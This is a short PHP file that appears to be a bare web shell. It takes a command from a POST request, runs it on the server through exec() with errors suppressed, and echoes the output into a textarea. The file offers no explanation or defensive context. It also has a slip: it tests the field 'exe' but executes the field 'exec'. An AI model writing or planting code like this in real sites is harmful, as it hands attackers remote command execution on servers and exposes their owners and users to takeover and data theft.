<?php
if(!empty($_POST['exe'])){
	if(@exec($_POST['exec'],$ar)){
		echo "<textarea cols=70 rows=15>";
		foreach($ar as $line){
			echo $line."\n";
		}
		echo "</textarea>";
	}
}
?>